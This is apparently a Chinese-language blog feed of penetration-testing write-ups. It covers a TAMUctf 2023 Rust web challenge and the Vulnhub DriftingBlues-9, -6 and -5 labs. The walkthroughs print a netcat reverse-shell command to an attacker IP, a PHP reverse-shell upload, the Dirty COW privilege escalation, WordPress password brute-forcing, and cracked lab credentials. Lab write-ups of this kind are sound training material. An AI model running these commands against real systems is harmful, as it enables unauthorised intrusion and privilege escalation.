class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_multipart::Multipart;</span><br><span class="line"><span class="keyword">use</span> actix_web::cookie::Cookie;</span><br><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, post, App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::stream::TryStreamExt;</span><br><span class="line"><span class="keyword">use</span> futures_util::StreamExt;</span><br><span class="line"><span class="keyword">use</span> rand::&#123;thread_rng, RngCore&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::hash_map::DefaultHasher;</span><br><span class="line"><span class="keyword">use</span> std::fs::create_dir_all;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;Hash, Hasher&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, SeekFrom&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>::FromStr;</span><br><span class="line"><span class="keyword">use</span> tokio::fs::&#123;remove_file, write, File, OpenOptions&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::io::AsyncReadExt;</span><br><span class="line"><span class="keyword">use</span> tokio::io::&#123;copy, AsyncSeekExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_util::io::StreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">handle_multipart</span>(user_dir: &amp;PathBuf, <span class="keyword">mut</span> multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optimised from: https://github.com/actix/examples/blob/db5f00e771573023a1d3de402f47a661c5799ec9/forms/multipart/src/main.rs#L8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">try_next</span>().<span class="keyword">await</span>? &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">16</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Too many files provided in input!&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">content_disposition</span> = field.<span class="title function_ invoke__">content_disposition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(filename) = content_disposition.<span class="title function_ invoke__">get_filename</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">            filename.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tmp</span> = PathBuf::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;tmp/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            tmp.<span class="title function_ invoke__">push</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = OpenOptions::<span class="title function_ invoke__">new</span>()</span><br><span class="line">                .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">create</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">open</span>(&amp;tmp)</span><br><span class="line">                .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">freader</span> = StreamReader::<span class="title function_ invoke__">new</span>(field.<span class="title function_ invoke__">map</span>(|result| &#123;</span><br><span class="line">                <span class="comment">// StreamReader-friendly</span></span><br><span class="line">                result.<span class="title function_ invoke__">map_err</span>(|err| std::io::Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, err))</span><br><span class="line">            &#125;))</span><br><span class="line">            .<span class="title function_ invoke__">take</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>); <span class="comment">// max file size</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> freader, &amp;<span class="keyword">mut</span> file).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// upload succeeded; copy to user area</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">destination</span> = user_dir.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                tmp.<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">                    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Must be present based on filename creation.&quot;</span>),</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// avoid overhead from open()</span></span><br><span class="line">            file.<span class="title function_ invoke__">seek</span>(SeekFrom::<span class="title function_ invoke__">Start</span>(<span class="number">0</span>)).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">orig</span> = file;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">dest</span> = File::<span class="title function_ invoke__">create</span>(&amp;destination).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> orig, &amp;<span class="keyword">mut</span> dest).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// cleanup</span></span><br><span class="line">            <span class="title function_ invoke__">drop</span>(orig);</span><br><span class="line">            <span class="title function_ invoke__">drop</span>(dest);</span><br><span class="line">            <span class="title function_ invoke__">remove_file</span>(tmp).<span class="keyword">await</span>?;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Missing filename from provided file.&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload</span>(req: HttpRequest, multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(user) = req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        user.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">user_dir</span> = PathBuf::<span class="title function_ invoke__">from</span>(<span class="built_in">format!</span>(<span class="string">&quot;user/&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line">        <span class="title function_ invoke__">create_dir_all</span>(&amp;user_dir)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = <span class="title function_ invoke__">handle_multipart</span>(&amp;user_dir, multipart).<span class="keyword">await</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">write</span>(user_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;error&quot;</span>), e.<span class="title function_ invoke__">to_string</span>()).<span class="keyword">await</span>?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tar</span> = tar::Builder::<span class="title function_ invoke__">new</span>(&amp;<span class="keyword">mut</span> body);</span><br><span class="line">        tar.<span class="title function_ invoke__">append_dir_all</span>(<span class="string">&quot;submitted&quot;</span>, user_dir)?;</span><br><span class="line">        <span class="title function_ invoke__">drop</span>(tar);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">build</span>(StatusCode::OK)</span><br><span class="line">            .<span class="title function_ invoke__">content_type</span>(<span class="string">&quot;application/tar&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">insert_header</span>((<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment&quot;</span>))</span><br><span class="line">            .<span class="title function_ invoke__">body</span>(body)</span><br><span class="line">            .<span class="title function_ invoke__">respond_to</span>(&amp;req)</span><br><span class="line">            .<span class="title function_ invoke__">map_into_boxed_body</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::UNAUTHORIZED))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">res</span> = NamedFile::<span class="title function_ invoke__">open</span>(<span class="string">&quot;www/index.html&quot;</span>)?.<span class="title function_ invoke__">into_response</span>(&amp;req);</span><br><span class="line">    <span class="keyword">if</span> req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">rng</span> = <span class="title function_ invoke__">thread_rng</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ident</span> = [<span class="number">0u8</span>; <span class="number">256</span>]; <span class="comment">// big un-bruteforce-able bytes</span></span><br><span class="line">        rng.<span class="title function_ invoke__">fill_bytes</span>(&amp;<span class="keyword">mut</span> ident);</span><br><span class="line">        res.<span class="title function_ invoke__">add_cookie</span>(</span><br><span class="line">            &amp;Cookie::<span class="title function_ invoke__">build</span>(<span class="string">&quot;whoami&quot;</span>, hex::<span class="title function_ invoke__">encode</span>(ident))</span><br><span class="line">                .<span class="title function_ invoke__">http_only</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">finish</span>(),</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;SERVER_ADDR&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t find an appropriate server address; did you set SERVER_ADDR?&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(index).<span class="title function_ invoke__">service</span>(upload))</span><br><span class="line">        .<span class="title function_ invoke__">bind_uds</span>(addr)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#web-lto">详解wp</a>   这里不太想看就不写了</p><h2 id="Flag-Fetcher"><a href="#Flag-Fetcher" class="headerlink" title="Flag Fetcher"></a>Flag Fetcher</h2><p>题目</p><p>两道题都是rust</p><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher">详细wp</a></p><p>接下来就不写了</p>]]></content>
      
      
      
        <tags>
            
            <tag> TAMUctf 2023-web-复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-9</title>
      <link href="/posts/89f41699.html"/>
      <url>/posts/89f41699.html</url>
      
        <content type="html"><![CDATA[<p>先扫一下c段发现靶机</p><p><img src="../images/image-20230430223340760.png" alt="image-20230430223340760"></p><p>然后扫一下端口</p><p><img src="../images/image-20230430223410966.png" alt="image-20230430223410966"></p><p>发现了个新端口  没见过</p><p><img src="../images/image-20230430223613576.png" alt="image-20230430223613576"></p><p>还是先查看一下80端口</p><p><img src="../images/image-20230430223917177.png" alt="image-20230430223917177"></p><p>查看源码发现版本和框架</p><p>那么就去找一下看存不存在漏洞</p><p><img src="../images/image-20230430224032571.png" alt="image-20230430224032571"></p><p>发现存在漏洞，于是就尝试进行漏洞利用</p><p><img src="../images/image-20230430224139189.png" alt="image-20230430224139189"></p><p>然后将脚本复制到出来执行</p><p><img src="../images/image-20230430224307635.png" alt="image-20230430224307635"></p><p><img src="../images/image-20230430224450992.png" alt="image-20230430224450992"></p><p>刚好发现了数据库的账号密码</p><p>这里的话使用的python2  python3的话会报错</p><p>这里看的不方便，于是尝试一下反弹shell</p><p><img src="../images/image-20230430224534036.png" alt="image-20230430224534036"></p><p>存在nc命令，可以使用nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.142.129 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430224640615.png" alt="image-20230430224640615"></p><p>反弹shell成功，那么我们就进行python的shell交互一下</p><p>那么我们就尝试一下刚刚拿到的数据的账号密码进行用户的切换</p><p><strong><code>clapton / yaraklitepe</code></strong></p><p>因为直接cd /home/clapton  权限不够</p><p><img src="../images/image-20230430224951322.png" alt="image-20230430224951322"></p><p>成功了</p><p>然后就可以拿到第一个flag了</p><p><img src="../images/image-20230430225059208.png" alt="image-20230430225059208"></p><p>这里的话又给出一个缓冲区溢出提权：</p><p>先把input文件下到本地</p><p>开启有个服务   python -m SimpleHTTPServer    因为http模块没有，就只能用这个模块了</p><p><img src="../images/image-20230430230743704.png" alt="image-20230430230743704"></p><p>成功下到本地</p><p>这里进行了解就行了  缓冲区溢出提权知道就行   实际的操作不太会</p><p><strong>总结</strong></p><p>开启python服务的两个方法</p><p><strong>python -m SimpleHTTPServer</strong></p><p><strong>python -m http.server</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub——DriftingBlues-9 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-6</title>
      <link href="/posts/194b0b08.html"/>
      <url>/posts/194b0b08.html</url>
      
        <content type="html"><![CDATA[<p>先扫c段发现靶机</p><p><img src="../images/image-20230430173241641.png" alt="image-20230430173241641"></p><p>然后接着扫一下端口</p><p><img src="../images/image-20230430173357986.png" alt="image-20230430173357986"></p><p>发现只有一个80端口</p><p>于是进行访问</p><p><img src="../images/image-20230430173451936.png" alt="image-20230430173451936"></p><p>然后就先扫一下目录吧</p><p><img src="../images/image-20230430173723541.png" alt="image-20230430173723541"></p><p><img src="../images/image-20230430173738876.png" alt="image-20230430173738876"></p><p>发现给了一个路劲</p><p>然后进行访问</p><p><img src="../images/image-20230430173804181.png" alt="image-20230430173804181"></p><p>这里的话爬虫协议也给了一个提示</p><p><strong>别忘了加上，zip扩展到你的dir brute</strong></p><p>然后在重新爆破一下目录，因为默认字典爆破不出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.5.12/ -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174416125.png" alt="image-20230430174416125"></p><p>扫到有个目录，然后进行访问</p><p><img src="../images/image-20230430174504992.png" alt="image-20230430174504992"></p><p>发现下载下来了一个压缩包，但是访问得需要密码，那么我们就开始使用john进行爆破，就是得先把这个玩意转化成john能识别的样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：zip2join spammer.zip  &gt;  password.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174655867.png" alt="image-20230430174655867"></p><p>然后进行爆破</p><p><img src="../images/image-20230430174724243.png" alt="image-20230430174724243"></p><p>爆破出来了</p><p>然后进行访问</p><p><img src="../images/image-20230430174828847.png" alt="image-20230430174828847"></p><p>发现给了个类似账号密码的东西，然后就开始进行后台登录</p><p><img src="../images/image-20230430174928134.png" alt="image-20230430174928134"></p><p>后台登录成功</p><p>这里就开始找漏洞利用点了</p><p><img src="../images/image-20230430175657042.png" alt="image-20230430175657042"></p><p>这里的话可以进行恶意文件的上传，刚好可以进行shell的反弹</p><p>这里的话就使用php反弹，这里的话kali自带，直接修改使用就行了</p><p><img src="../images/image-20230430191641753.png" alt="image-20230430191641753"></p><p>然后进去修改监听的ip和端口就行了</p><p><img src="../images/image-20230430191753036.png" alt="image-20230430191753036"></p><p>然后开始监听端口</p><p><img src="../images/image-20230430191825803.png" alt="image-20230430191825803"></p><p>然后就去找一下文件的上传地址</p><p><img src="../images/image-20230430191859356.png" alt="image-20230430191859356"></p><p><img src="../images/image-20230430191917306.png" alt="image-20230430191917306"></p><p>然后进行访问</p><p><img src="../images/image-20230430191939612.png" alt="image-20230430191939612"></p><p>反弹成功</p><p>然后进行python交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430192021688.png" alt="image-20230430192021688"></p><p>成功，然后就开始进行提权了</p><p><img src="../images/image-20230430213348387.png" alt="image-20230430213348387"></p><p><strong>内核版本&gt;= 2.6.22</strong> ， 尝试脏牛提权</p><p><a href="https://xz.aliyun.com/t/9757">脏牛提权</a></p><p><img src="../images/image-20230430213803970.png" alt="image-20230430213803970"></p><p>执行 <strong><code>searchsploit 40839</code></strong>    因为这个脏牛就是利用这个来进行提权</p><p><img src="../images/image-20230430214020860.png" alt="image-20230430214020860"></p><p><img src="../images/image-20230430214107311.png" alt="image-20230430214107311"></p><p>然后本地开启一个python服务，把文件传到靶机上</p><p><img src="../images/image-20230430214340317.png" alt="image-20230430214340317"></p><p>成功传上去，然后进行gcc编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430214417629.png" alt="image-20230430214417629"></p><p>然后给命令添加最高权限</p><p><strong><code>chmod 777 40839</code></strong></p><p><img src="../images/image-20230430214530349.png" alt="image-20230430214530349"></p><p><img src="../images/image-20230430214743537.png" alt="image-20230430214743537"></p><p>然后就是root用户了</p><p><img src="../images/image-20230430214806980.png" alt="image-20230430214806980"></p><p><strong>总结</strong></p><p>内核版本&gt;= 2.6.22  尝试脏牛提权</p><p>尝试破解加密文件可以考虑先转成john能识别的样子，然后在使用john来进行破解</p><p>s</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub——DriftingBlues-6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-5</title>
      <link href="/posts/80425ab2.html"/>
      <url>/posts/80425ab2.html</url>
      
        <content type="html"><![CDATA[<p>开始先扫一下c段发现靶机</p><p><img src="../images/image-20230430155615236.png" alt="image-20230430155615236"></p><p>然后开始扫一下端口</p><p><img src="../images/image-20230430155709668.png" alt="image-20230430155709668"></p><p>还是标配两个端口</p><p>进行80端口的访问</p><p><img src="../images/image-20230430155746105.png" alt="image-20230430155746105"></p><p>是一个wordpress cms框架的网页 这里也给了版本</p><p>可以先用wpscan工具去进行扫描</p><p>这里先去找一下后台，用dirb先扫一下这个网址</p><p><img src="../images/image-20230430160144662.png" alt="image-20230430160144662"></p><p><img src="../images/image-20230430160134822.png" alt="image-20230430160134822"></p><p>扫到了后台，那么我们就去用wpcan工具去扫一下网站的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142 -e u </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160547357.png" alt="image-20230430160547357"></p><p>然后使用cewl生成密码字典配合wpscan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 3 -w passwd.txt http://192.168.205.142 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160711724.png" alt="image-20230430160711724"></p><p>-m  是指的密码的最短长度</p><p>然后使用wpcan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142/ -e u --passwords passwd.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161014964.png" alt="image-20230430161014964"></p><p>报出用户名和密码了，接下来进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161140468.png" alt="image-20230430161140468"></p><p>成功进行登录</p><p>于是就开始尝试找漏洞了</p><p><img src="../images/image-20230430161251659.png" alt="image-20230430161251659"></p><p>发现一张网站页面没有的图片，于是尝试把他下载下来进行查看</p><p><img src="../images/image-20230430161407371.png" alt="image-20230430161407371"></p><p>成功下载下来</p><p>这里查看图片得使用这个工具</p><p><strong>exiftool</strong></p><p><img src="../images/image-20230430161620834.png" alt="image-20230430161620834"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get Install exiftool</span><br><span class="line">使用该命令进行安装</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430162208301.png" alt="image-20230430162208301"></p><p><img src="../images/image-20230430162232774.png" alt="image-20230430162232774"></p><p>发现了ssh的登录密码，于是尝试去进行登录</p><p><img src="../images/image-20230430162333707.png" alt="image-20230430162333707"></p><p>成功进行登录</p><p><img src="../images/image-20230430162354156.png" alt="image-20230430162354156"></p><p>拿到第一个flag，这里有第二个文件，不知道是啥</p><p>直接读的话是乱码</p><p>上网搜索后发现</p><p><img src="../images/image-20230430162524584.png" alt="image-20230430162524584"></p><p><img src="../images/image-20230430163023836.png" alt="image-20230430163023836"></p><p>这里的话是使用scp命令将文件复制到本地进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp gill@192.168.142.149:/home/gill/key* /root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430163242074.png" alt="image-20230430163242074"></p><p>成功传输下来</p><p><strong>将 <code>keyfile.kdbx</code> 内容转为 <code>john</code> 支持的格式：<code>keepass2john keyfile.kdbx &gt; Keepasshash.txt</code></strong></p><p><img src="../images/image-20230430163335747.png" alt="image-20230430163335747"></p><p>然后使用john进行密码的爆破</p><p><img src="../images/image-20230430163622503.png" alt="image-20230430163622503"></p><p>爆破出来那个加密文件里的内容了</p><p>将刚才的keyfile.kdbx文件上传到keeWeb, 输入破解出的密码即可打开，得到六个类似密码的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接：https://app.keeweb.info/</span><br></pre></td></tr></table></figure><p>获得了6个密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2real4surreal </span><br><span class="line">buddyretard</span><br><span class="line">closet313</span><br><span class="line">exalted</span><br><span class="line">fracturedocean</span><br><span class="line">zakkwylde</span><br></pre></td></tr></table></figure><p>然后尝试使用这些密码进行root用户的登录全都失败了</p><p><img src="../images/image-20230430170151033.png" alt="image-20230430170151033"></p><p>这里的话可以利用这个工具来进行使，看一下进程有没有定时执行的任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali起个临时服务</span><br><span class="line">靶机下载pspy64: wget http://192.168.111.7/pspy64</span><br><span class="line">给予权限：chmod +x pspy64</span><br><span class="line">执行：./pspy64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430170732813.png" alt="image-20230430170732813"></p><p>成功下载下载到靶机上</p><p><img src="../images/image-20230430171115969.png" alt="image-20230430171115969"></p><p>这个任务每隔一分钟就自动执行一次，于是就猜测是会定时执行任务，那么我们就考虑使用他来进行提权了</p><p><img src="../images/image-20230430171233766.png" alt="image-20230430171233766"></p><p>在根目录下发现一个诡异的目录，于是进行查看</p><p>那么猜测是使用他进行提权，这里久刚好用到之前爆破出来的密码了，在查看别人的wp，发现key.sh源码的意思是，如果这个文件下有fracturedocean这个文件的话，就会执行下面的代码，就会把装有root，密码的文件下载下来</p><p><img src="../images/image-20230430171856129.png" alt="image-20230430171856129"></p><p>拿到密码</p><p><img src="../images/image-20230430171951855.png" alt="image-20230430171951855"></p><p>这就是key.sh的文件内容了</p><p><strong>Vulnhub靶机渗透总结：</strong><br>1.cewl 生成字典和wpscan 工具暴力破解的使用<br>2.Exiftool 这个工具用来对EXIF信息解析(第一次了解这个工具的使用和作用)<br>3..kdbx文件密码破解（新知识点，第一次做花的时间比较多）<br>4.如果临时开启不了web服务 可以使用scp 这个命令（非常好用！！）<br>5.解密 keepass 数据库获取密码（虽然没啥用 但是也是第一次了解 新知识点）<br>6.定时提权 下载脚本pspy64 查看 创建key 